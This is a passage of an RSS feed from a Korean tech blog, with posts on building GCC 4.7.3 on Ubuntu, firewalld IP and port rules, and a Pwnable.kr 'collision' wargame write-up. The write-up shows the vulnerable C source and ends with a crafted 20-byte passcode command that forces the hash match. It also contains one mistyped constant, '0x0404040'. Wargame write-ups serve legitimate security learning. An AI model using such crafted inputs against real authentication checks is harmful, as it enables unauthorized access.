&lt;p&gt;이 명령은 표준 입력을 받아 처리를 하는데, 그렇기 때문에 스크립트에서 사용하기 위해서는 &lt;code class=&quot;language-text&quot;&gt;파이프&lt;/code&gt; 또는 &lt;code class=&quot;language-text&quot;&gt;리다이렉트&lt;/code&gt;를 사용하여 처리를 할 수 있다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[GCC 4.7.3 (Ubuntu 14.04.4 LTS)]]></title><description><![CDATA[http://ftp.kaist.ac.kr/gnu/gnu/gcc/gcc-4.7.3/에서 압축파일을 받는다. 압축을 풀고 명령을 사용한다. make를 실행한다. 이러한 에러가 나올 경우,  를 사용한다. make…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Tue, 19 Apr 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;http://ftp.kaist.ac.kr/gnu/gnu/gcc/gcc-4.7.3/&quot;&gt;http://ftp.kaist.ac.kr/gnu/gnu/gcc/gcc-4.7.3/&lt;/a&gt;에서 압축파일을 받는다.&lt;/p&gt;
&lt;p&gt;압축을 풀고&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:/usr/local/src/gcc-4.7.3&lt;span class=&quot;token comment&quot;&gt;# ./configure --prefix=&quot;원하는 디렉토리&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;명령을 사용한다.&lt;/p&gt;
&lt;p&gt;make를 실행한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:/usr/local/src/gcc-4.7.3&lt;span class=&quot;token comment&quot;&gt;# make&lt;/span&gt;
 &lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
/usr/include/features.h:374:25: fatal error: sys/cdefs.h: No such &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt; or directory
compilation terminated.
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: *** &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;_muldi3.o&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Error &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: Leaving directory &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;/usr/local/src/gcc-4.7.3/x86_64-unknown-linux-gnu/32/libgcc&apos;
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: *** &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;multi-do&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Error &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: Leaving directory &lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;&lt;/span&gt;/usr/local/src/gcc-4.7.3/x86_64-unknown-linux-gnu/libgcc&lt;span class=&quot;token string&quot;&gt;&apos;
make[3]: *** [all-multi] Error 2
make[3]: Leaving directory `/usr/local/src/gcc-4.7.3/x86_64-unknown-linux-gnu/libgcc&apos;&lt;/span&gt;
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: *** &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;all-stage1-target-libgcc&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Error &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: Leaving directory &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;/usr/local/src/gcc-4.7.3&apos;
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: *** &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;stage1-bubble&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Error &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: Leaving directory &lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;&lt;/span&gt;/usr/local/src/gcc-4.7.3&apos;
make: *** &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;all&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Error &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이러한 에러가 나올 경우, &lt;code class=&quot;language-text&quot;&gt;apt-get install libc6-dev-i386&lt;/code&gt; 를 사용한다.&lt;/p&gt;
&lt;p&gt;make를 다시 실행한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:/usr/local/src/gcc-4.7.3&lt;span class=&quot;token comment&quot;&gt;# make&lt;/span&gt;
 &lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
/usr/bin/ld: cannot &lt;span class=&quot;token function&quot;&gt;find&lt;/span&gt; crti.o: No such &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt; or directory
collect2: error: ld returned &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;exit&lt;/span&gt; status
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: *** &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;libgcc_s.so&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Error &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: Leaving directory &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;/usr/local/src/gcc-4.7.3/x86_64-unknown-linux-gnu/32/libgcc&apos;
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: *** &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;multi-do&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Error &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: Leaving directory &lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;&lt;/span&gt;/usr/local/src/gcc-4.7.3/x86_64-unknown-linux-gnu/libgcc&lt;span class=&quot;token string&quot;&gt;&apos;
make[3]: *** [all-multi] Error 2
make[3]: Leaving directory `/usr/local/src/gcc-4.7.3/x86_64-unknown-linux-gnu/libgcc&apos;&lt;/span&gt;
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: *** &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;all-stage1-target-libgcc&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Error &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: Leaving directory &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;/usr/local/src/gcc-4.7.3&apos;
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: *** &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;stage1-bubble&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Error &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;
make&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;: Leaving directory &lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;&lt;/span&gt;/usr/local/src/gcc-4.7.3&apos;
make: *** &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;all&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Error &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 에러가 나올 경우&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token assign-left variable&quot;&gt;LIBRARY_PATH&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/usr/lib/x86_64-linux-gnu:&lt;span class=&quot;token variable&quot;&gt;$LIBRARY_PATH&lt;/span&gt;
&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; LIBRARY_PATH&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;명령을 사용하여 해결하였지만, 다른 에러가 나와 진행되지 않았다.&lt;/p&gt;
&lt;p&gt;그래서 &lt;code class=&quot;language-text&quot;&gt;./configure --disable-multilib&lt;/code&gt; 이 옵션을 추가하여 다시 makefile을 만든 후,&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;unset&lt;/span&gt; LIBRARY_PATH
./configure -v
&lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;를 수행하였더니 컴파일이 완료되었다. 안되는 이유에 대해서는 모르겠다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[firewalld 특정 아이피 특정 포트 방화벽 설정]]></title><description><![CDATA[CentOS 7 부터는 이라는 방화벽을 사용하게 된다. 이 방화벽을 사용할 때 특정 아이피에서 특정 포트만 사용하고 싶은 경우가 있다. 이 때 다음과 같은 명령으로 사용하면 된다. 여기서 ip와 netmask…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sun, 27 Mar 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;CentOS 7 부터는 &lt;code class=&quot;language-text&quot;&gt;firewalld&lt;/code&gt;이라는 방화벽을 사용하게 된다.&lt;/p&gt;
&lt;p&gt;이 방화벽을 사용할 때 특정 아이피에서 특정 포트만 사용하고 싶은 경우가 있다.&lt;/p&gt;
&lt;p&gt;이 때 다음과 같은 명령으로 사용하면 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# firewall-cmd --permanent --zone=public --add-rich-rule=&apos;rule family=&quot;ipv4&quot; source address=&quot;192.168.123.123/32&quot; service name=&quot;ssh&quot; log prefix=&quot;ssh&quot; accept&apos;&lt;/span&gt;
success
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# firewall-cmd --reload&lt;/span&gt;
success&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;여기서 ip와 netmask를 계산하여 적어주면 된다.&lt;/p&gt;
&lt;p&gt;위의 예시는 192.168.123.123아이피의 ssh서비스를 방화벽 해제하는 예시다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;--permanent&lt;/code&gt;는 설정파일에 적용을 하는 것이고, 이 옵션을 사용하면 &lt;strong&gt;영구적용&lt;/strong&gt;을 할 수 있다.&lt;/p&gt;
&lt;p&gt;이 옵션을 사용하지 않을 경우 firewalld가 재시작 될 경우 방화벽에 추가한 명령이 적용되지 않는다.&lt;/p&gt;
&lt;p&gt;서비스가 아닌 포트를 적용시킬 경우는 다음과 같이 설정하면 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# firewall-cmd --permanent --zone=public --add-rich-rule=&apos;rule family=&quot;ipv4&quot; source address=&quot;192.168.123.123/32&quot; port protocol=&quot;tcp&quot; port=&quot;4567&quot; log prefix=&quot;log&quot; accept&apos;&lt;/span&gt;
success
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# firewall-cmd --reload&lt;/span&gt;
success&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;방화벽 제거를 하려면 —add-rich-rule대신 &lt;code class=&quot;language-text&quot;&gt;--remove-rich-rule&lt;/code&gt;을 사용하면 된다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Pwnable.kr collision]]></title><description><![CDATA[이와 같은 코드를 볼 수 있다. 이 코드는 hashcode의 값을 비교하는데, 사용자가 입력한 char배열의 값이 check_password에 들어가 검사를 하게 된다. char배열이 들어갔지만, int…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 26 Mar 2016 18:00:00 GMT</pubDate><content:encoded>&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;col@ubuntu&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;~&lt;/span&gt;$ ls
col  col&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;c  flag
col@ubuntu&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;~&lt;/span&gt;$ cat col&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;c
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;string.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt; hashcode &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x21DD09EC&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;check_password&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; p&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; ip &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; res&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        res &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; ip&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; res&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; argc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;argc&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;usage : %s [passcode]\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;passcode length should be 20 bytes\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;hashcode &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;check_password&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;wrong passcode.\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이와 같은 코드를 볼 수 있다. 이 코드는 hashcode의 값을 비교하는데, 사용자가 입력한 char배열의 값이 check_password에 들어가 검사를 하게 된다.&lt;/p&gt;
&lt;p&gt;char배열이 들어갔지만, int*로 캐스팅하여 사용한다. 이때 &lt;code class=&quot;language-text&quot;&gt;리틀엔디안&lt;/code&gt;을 신경써서 넣어야 한다.&lt;/p&gt;
&lt;p&gt;값이 &lt;code class=&quot;language-text&quot;&gt;0x01020304&lt;/code&gt;라 하여도, 실제로 메모리에 들어간 정보를 보면 &lt;code class=&quot;language-text&quot;&gt;0x04&lt;/code&gt; &lt;code class=&quot;language-text&quot;&gt;0x03&lt;/code&gt; &lt;code class=&quot;language-text&quot;&gt;0x02&lt;/code&gt; &lt;code class=&quot;language-text&quot;&gt;0x01&lt;/code&gt;순서로 들어가게 된다.&lt;/p&gt;
&lt;p&gt;그러므로 값을 넣을 때에도 순서를 &lt;strong&gt;반대&lt;/strong&gt;로 해 주어야 한다. int형 이기 때문에 4byte씩 묶여서 더하기가 된다. 그러므로 4byte씩 잘라서 넣어주어야 한다.&lt;/p&gt;
&lt;p&gt;하지만 &lt;code class=&quot;language-text&quot;&gt;NULL&lt;/code&gt;문자는 처리를 하지 못하므로 최소 1의 값을 넣어주어야 한다. 0x01010101을 4번 넣고 원하는 값을 넣어주면 총 20byte의 값이 된다.&lt;/p&gt;
&lt;p&gt;원하는 값은 0x21DD09EC - 0x0404040 (0x01010101을 4번 넣었기 때문)을 해준 값으로, 0x1DD905E8을 넣어주면 된다. 하지만 리틀엔디안 형식이므로 값을 거꾸로 넣어 &lt;code class=&quot;language-text&quot;&gt;0xE805D91D&lt;/code&gt;를 넣어 주면 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;col@ubuntu:~$ ./col &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;python -c &lt;span class=&quot;token string&quot;&gt;&apos;print &quot;\x01&quot; * 16 + &quot;\xE8\x05\xD9\x1D&quot;&apos;&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;&lt;/span&gt;
